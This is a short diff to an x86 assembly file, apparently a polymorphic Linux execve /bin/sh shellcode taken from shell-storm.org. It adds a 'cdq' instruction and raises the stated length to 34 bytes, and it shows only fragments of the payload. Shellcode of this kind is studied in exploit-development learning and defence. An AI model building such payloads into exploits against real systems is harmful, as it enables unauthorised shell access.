@@ -1,7 +1,7 @@
 ; Linux/x86 - execve /bin/sh shellcode
 ; Polymorphic version
 ; http://shell-storm.org/shellcode/files/shellcode-827.php
-; shellcode length: 33 bytes
+; shellcode length: 34 bytes
 
 global _start
 
@@ -10,6 +10,7 @@ section .text
 	_start:
 		
 	   	xor    eax,eax		; eax=NULL
+		cdq			; edx=NULL
     	   	push   eax		
 
 		;push   0x46512f2f	; hs//	
